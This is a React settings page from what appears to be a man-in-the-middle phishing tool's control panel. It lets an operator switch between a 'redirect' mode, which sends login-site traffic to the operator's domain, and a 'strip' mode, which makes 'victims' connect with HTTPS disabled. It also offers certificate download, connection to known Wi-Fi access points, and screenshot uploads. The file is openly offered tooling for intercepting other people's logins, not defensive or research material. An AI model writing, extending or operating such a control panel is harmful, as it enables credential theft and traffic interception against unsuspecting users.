import React, { useState, useRef } from 'react';
import { Segment, Radio, Header, Loader, Button } from 'semantic-ui-react';
import ErrMsg from '../components/ErrMsg';
import ConnStatus from '../components/ConnStatus';
import DownloadCert from '../components/settings/DownloadCert';
import { useAPI } from '../hooks';
import { BACKEND } from '../config';
import "../styles/settings.css";

const headUpper = (text) => text[0].toUpperCase() + text.substring(1,);

export default () => {
  const [cachedMode, setCachedMode] = useState("");
  const [modeState, getMode] = useAPI("text");
  const [setModeState, setMode] = useAPI();
  const [knownWifi, getKnownWifi] = useAPI("json");
  const [setWifiState, setWifi, initSetWifi] = useAPI();
  const [wifiId, setWifiId] = useState(-1);
  const fileInput = useRef();
  const pathInput = useRef();
  const [uploaded, setUploaded] = useState(-1);
  const [uploading, setUploading] = useState(false);
  const [failedFiles, setFailedFiles] = useState([]);

  if (cachedMode === "" && modeState.response && modeState.response !== "") {
    setCachedMode(modeState.response);
  }
  const modes = ["redirect", "strip"];
  const redirect_desc = "All the traffics that connect to the login website will be redirect to your domain.";
  const strip_desc = "All the victims will connect to the login website with HTTPS disabled.";

  const handleModeChange = (newMode) => {
    setMode(BACKEND + `/cmd?cmd=set_mode&param=${newMode}`);
    setCachedMode(newMode);
  }

  const handleUpload = async (files) => {
    setUploading(true);
    setUploaded(0);
    setFailedFiles([]);

    const path = pathInput.current.value;
    let tmpFailedFiles = [];
    let tmpUploaded = 0;
    const uploadFile = async (file) => {
      return fetch(BACKEND+`/upload?dir=${path}&filename=${file.name}`, {
        body: file,
        method: 'POST'
      })
      .then(res => {
        if (res.status === 200) setUploaded(tmpUploaded += 1);
        else tmpFailedFiles.push(file.name);
      })
      .catch(err => err);
    }

    await Promise.all(Array.from(files).map(file => uploadFile(file)));
    setUploading(false);
    setFailedFiles(tmpFailedFiles);
  }
  
  if (knownWifi.isInit()) {
    getKnownWifi(BACKEND + "/cmd?cmd=get_known_wifi");
  }
  if (modeState.isInit()) {
    getMode(BACKEND + "/cmd?cmd=get_mode");
  }
  if (modeState.isInit() || modeState.loading || cachedMode === "") {
    return <Loader active>Load settings...</Loader>
  }
  else if (modeState.error) {
    return <ErrMsg />;
  }

  return (
    <div>
      <div className="settings-block">
        <DownloadCert />
        <Segment>
          <Header as='h2'>Select attack mode</Header>
          <div className="settings-block-content">
            <div>
              <strong>{headUpper(cachedMode)} mode:</strong>
              <br />
              {cachedMode === 'redirect' ? redirect_desc : strip_desc}
            </div>
            <div>
              {
                modes.map(_mode => (
                  <Radio
                    key={_mode}
                    className="settings-radio"
                    label={headUpper(_mode)}
                    name="modeGroup"
                    value={_mode}
                    checked={cachedMode === _mode}
                    onChange={() => handleModeChange(_mode)}
                  />
                ))
              }
            </div>
          </div>
          <ConnStatus state={setModeState} timeout={3000} />
        </Segment>
        <Segment>
          <Header as='h2'>Connect to known AP</Header>
          {knownWifi.loading ? <Loader active>Loading known APs...</Loader> : null}
          {knownWifi.error ? <ErrMsg /> : null}
          {knownWifi.success ? (
            <React.Fragment>
              {knownWifi.response.map(wifi => (
                <Button
                  style={{ marginTop: "0.5rem", marginBottom: "0.5rem" }}
                  key={wifi["network id"]}
                  loading={wifiId === wifi["network id"] && setWifiState.loading}
                  positive={wifiId === wifi["network id"] && setWifiState.success}
                  negative={wifiId === wifi["network id"] && setWifiState.error}
                  onClick={_ => {
                    initSetWifi();
                    setWifiId(wifi["network id"]);
                    setWifi(BACKEND + `/cmd?cmd=connect_wifi&param=${wifi["ssid"]}`);
                  }}>
                  {wifi["ssid"]}
                </Button>
              ))}
            </React.Fragment>
          ) : null}
        </Segment>
        <Segment>
          <Header as='h2'>Upload Screenshots</Header>
          <input style={{marginRight: "1rem"}} ref={pathInput} placeholder="Path" type="text" />
          <Button onClick={() => fileInput.current.click()}>
            Add Screenshot(s)
            <input 
              ref={fileInput}
              onInput={(_) => handleUpload(fileInput.current.files)} 
              type="file" multiple hidden 
            />
          </Button>
          <Loader active={uploading} />
          {uploading || uploaded > -1 ?<p>Uploaded: {uploaded} files. {failedFiles.length > 0? "Failed: "+failedFiles.join(", "):""}</p>:null}
        </Segment>
      </div>
    </div>
  )
}